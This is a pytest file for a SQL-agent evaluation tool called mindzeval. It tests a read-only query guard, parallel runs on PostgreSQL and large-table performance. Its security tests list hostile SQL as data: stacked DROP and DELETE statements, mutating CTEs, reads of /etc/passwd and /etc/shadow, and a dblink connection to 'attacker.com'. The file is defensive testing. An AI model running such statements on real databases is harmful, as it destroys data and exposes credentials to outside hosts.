"""Deep production-readiness verification across the remaining 3 pillars:
Pillar 1: Security Testing (SQL injection, stacked statements, mutating CTEs, dangerous functions, engine boundaries).
Pillar 2: Concurrency Testing (Parallel multi-turn evaluation against live PostgreSQL).
Pillar 3: Performance Testing (100,000-row joins on PostgreSQL, statement timeout enforcement, bounded memory).
"""

from __future__ import annotations

import os
import time
from pathlib import Path

import pytest

from mindzeval import Database, Verdict, load_project, run
from mindzeval.errors import QueryTimeoutError, SQLGuardError
from mindzeval.sql.guard import check_read_only

POSTGRES_URL = os.environ.get("MINDZEVAL_TEST_POSTGRES_URL", "postgresql://localhost/postgres")


# ==============================================================================
# PILLAR 1: SECURITY TESTING
# ==============================================================================


@pytest.mark.parametrize(
    "attack_sql",
    [
        "SELECT 1; DROP TABLE customers;",
        "SELECT * FROM customers; DELETE FROM orders WHERE 1=1;",
        "SELECT 1; UPDATE users SET password = 'hacked';",
        "SELECT 1 /* comment */ ; DROP TABLE users; --",
        "SELECT 1; CREATE TABLE evil (x INT);",
        "SELECT 1; ALTER TABLE customers DROP COLUMN email;",
        "SELECT 1; TRUNCATE TABLE orders;",
        "SELECT 1; GRANT ALL ON customers TO public;",
    ],
)
def test_security_stacked_statements_and_writes_blocked(attack_sql: str) -> None:
    """Stacked statements attempting database modifications must be rejected by the AST guard."""
    with pytest.raises(SQLGuardError) as exc_info:
        check_read_only(attack_sql, dialect="postgres")
    assert exc_info.value.kind in ("write", "multiple")


@pytest.mark.parametrize(
    "cte_payload",
    [
        "WITH victim AS (DELETE FROM customers RETURNING *) SELECT * FROM victim;",
        "WITH updater AS (UPDATE customers SET email = 'x' RETURNING *) SELECT * FROM updater;",
        "WITH inserter AS (INSERT INTO customers (id) VALUES (999) RETURNING *) SELECT * FROM inserter;",
    ],
)
def test_security_mutating_ctes_blocked(cte_payload: str) -> None:
    """Mutating CTEs disguised as SELECT queries must be caught by AST inspection."""
    with pytest.raises(SQLGuardError) as exc_info:
        check_read_only(cte_payload, dialect="postgres")
    assert exc_info.value.kind == "write"


@pytest.mark.parametrize(
    "dangerous_func",
    [
        "SELECT pg_read_file('/etc/passwd');",
        "SELECT pg_read_binary_file('/etc/shadow');",
        "SELECT lo_export(101, '/tmp/stolen_data');",
        "SELECT lo_import('/tmp/exploit');",
        "SELECT dblink_connect('conn', 'host=attacker.com');",
        "SELECT pg_terminate_backend(1);",
        "SELECT pg_sleep(10);",
        "SELECT load_extension('malicious.so');",
    ],
)
def test_security_dangerous_functions_blocked(dangerous_func: str) -> None:
    """Functions attempting filesystem access, remote connections, or sleep delays must be refused."""
    with pytest.raises(SQLGuardError) as exc_info:
        check_read_only(dangerous_func, dialect="postgres")
    assert exc_info.value.kind == "function"


def test_security_postgres_engine_permission_boundary() -> None:
    """Even if an attacker bypassed the SQL parser with raw driver execution,
    PostgreSQL's read-only transaction mode MUST block writes at the database kernel level.
    """
    with Database(POSTGRES_URL) as db:
        raw = db.engine.raw_connection()
        try:
            cursor = raw.cursor()
            cursor.execute("SET TRANSACTION READ ONLY")
            # Attempt to create a table directly inside the read-only transaction:
            with pytest.raises(Exception) as exc_info:
                cursor.execute("CREATE TEMP TABLE bypass_probe (id INT);")
            assert "read-only" in str(exc_info.value).lower()
        finally:
            raw.rollback()
            raw.close()


# ==============================================================================
# PILLAR 2: CONCURRENCY TESTING (Parallel execution on live PostgreSQL)
# ==============================================================================


def test_concurrency_parallel_evaluation_on_postgres(tmp_path: Path) -> None:
    """Execute 16 test cases concurrently with concurrency: 8 against PostgreSQL.
    Verifies that connection pool handles simultaneous checkout/checkin,
    statement timeouts isolate independently, and zero deadlocks occur.
    """
    # 1. Setup sample schema in PostgreSQL
    with Database(POSTGRES_URL) as db:
        raw = db.engine.raw_connection()
        try:
            cursor = raw.cursor()
            cursor.execute(
                """
                DROP TABLE IF EXISTS concurrent_test_items;
                CREATE TABLE concurrent_test_items (id INT PRIMARY KEY, score INT);
                INSERT INTO concurrent_test_items SELECT g, g * 10 FROM generate_series(1, 100) g;
                """
            )
            raw.commit()
        finally:
            raw.close()

    # 2. Generate 16 test cases
    case_entries = []
    for i in range(1, 17):
        case_entries.append(
            f"""
- id: case_{i}
  question: Query {i}
  reference_sql: SELECT id, score FROM concurrent_test_items WHERE id = {i}
  key: id
"""
        )
    (tmp_path / "cases.yaml").write_text("\n".join(case_entries))

    cfg_file = tmp_path / "mindzeval.yaml"
    cfg_file.write_text(
        f"""
project: concurrency-postgres
agent:
  type: python
  target: concurrent_agent:answer
  concurrency: 8
database:
  url: {POSTGRES_URL}
  statement_timeout_s: 5.0
datasets:
  - cases.yaml
"""
    )

    agent_code = """
import re

def answer(question, history):
    # Extract case id from question: 'Query 5' -> 5
    m = re.search(r'\\d+', question)
    case_num = int(m.group(0)) if m else 1
    return {
        "answer": f"Record {case_num}",
        "sql": f"SELECT id, score FROM concurrent_test_items WHERE id = {case_num}",
        "status": "answer",
    }
"""
    (tmp_path / "concurrent_agent.py").write_text(agent_code)

    project = load_project(cfg_file)
    started = time.perf_counter()
    res = run(project)
    elapsed = time.perf_counter() - started

    # Verify all 16 parallel turns completed successfully
    assert len(res.results) == 16
    assert all(r.verdict is Verdict.PASS for r in res.results)
    # 16 cases with concurrency 8 should complete very quickly
    assert elapsed < 10.0


# ==============================================================================
# PILLAR 3: PERFORMANCE TESTING (100,000-row joins on PostgreSQL & Bounded Memory)
# ==============================================================================


def test_performance_100k_rows_on_postgres_and_bounded_memory(tmp_path: Path) -> None:
    """Setup a 100,000-row table and a 10,000-row table in PostgreSQL.
    Verify:
    1. Multi-table joins execute accurately.
    2. Uncapped replay against 100,000 rows hits max_rows cap, terminates fetch,
       and finishes sub-second without memory bloat.
    3. Statement timeouts accurately abort runaway queries.
    """
    with Database(POSTGRES_URL) as db:
        raw = db.engine.raw_connection()
        try:
            cursor = raw.cursor()
            cursor.execute(
                """
                DROP TABLE IF EXISTS perf_orders;
                DROP TABLE IF EXISTS perf_customers;

                CREATE TABLE perf_customers (
                    id INT PRIMARY KEY,
                    region TEXT
                );

                CREATE TABLE perf_orders (
                    id INT PRIMARY KEY,
                    customer_id INT,
                    amount NUMERIC(10, 2)
                );

                -- Populate 10,000 customers
                INSERT INTO perf_customers
                SELECT g, 'Region-' || (g % 5)
                FROM generate_series(1, 10000) g;

                -- Populate 100,000 orders
                INSERT INTO perf_orders
                SELECT g, (g % 10000) + 1, ((g * 13) % 1000)::numeric + 0.50
                FROM generate_series(1, 100000) g;
                """
            )
            raw.commit()
        finally:
            raw.close()

    # 1. Complex JOIN query performance test
    with Database(POSTGRES_URL, max_rows=100) as db:
        started = time.perf_counter()
        join_query = """
        SELECT c.region, count(o.id) AS order_count, sum(o.amount) AS total_revenue
        FROM perf_orders o
        JOIN perf_customers c ON c.id = o.customer_id
        GROUP BY c.region
        ORDER BY c.region;
        """
        result = db.fetch(join_query)
        latency = time.perf_counter() - started

        assert len(result.rows) == 5  # 5 regions
        assert latency < 2.0  # Must finish fast on PostgreSQL

    # 2. Memory bound check on 100,000-row table: max_rows=50
    with Database(POSTGRES_URL, max_rows=50) as db:
        started = time.perf_counter()
        # Full scan of 100,000 rows
        scan_result = db.fetch("SELECT id, amount FROM perf_orders ORDER BY id;")
        scan_time = time.perf_counter() - started

        assert scan_result.truncated is True
        assert len(scan_result.rows) == 50
        # Halted fetch immediately; must take well under 0.5s!
        assert scan_time < 0.5

    # 3. Timeout enforcement on PostgreSQL
    with (
        Database(POSTGRES_URL, statement_timeout_s=0.3) as db,
        pytest.raises(QueryTimeoutError),
    ):
        # Cartesian product / massive generate series that exceeds 0.3s
        db.fetch("SELECT count(*) FROM generate_series(1, 50000000);")
